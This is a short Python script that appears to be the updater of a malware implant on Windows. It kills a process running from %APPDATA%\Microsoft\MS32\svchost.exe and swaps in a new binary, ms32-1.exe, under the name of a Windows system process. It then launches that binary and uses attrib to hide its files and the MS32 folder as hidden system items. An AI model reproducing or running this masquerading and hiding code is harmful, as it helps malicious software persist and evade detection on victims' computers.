from os import remove, rename, startfile, path, getenv
from subprocess import run
from time import sleep
import psutil

sleep(2)
target_path = path.join(getenv("APPDATA"), "Microsoft", "MS32", "svchost.exe")
print(target_path)
def check(kill=False):
    for proc in psutil.process_iter(['pid', 'exe', 'name']):
        try:
            if proc.info['exe'] and path.normcase(proc.info['exe']) == path.normcase(target_path):
                if not kill:
                    return True
                else:
                    proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return False

if check():
    check(kill=True)
print("removing and starting...")
remove("svchost.exe")
rename("ms32-1.exe","svchost.exe")
startfile("svchost.exe")

listing = run("dir /b",shell=True,text=True,capture_output=True)
listing = listing.stdout.strip().split("\n")

for name in listing:
    # print(name,end="\n")
    run(["attrib","+h","+s",name])
sleep(6)
for name in listing:
    run(["attrib","-h","-s",name])
run(["attrib","+h","+s",path.join(getenv("APPDATA"), "Microsoft", "MS32")])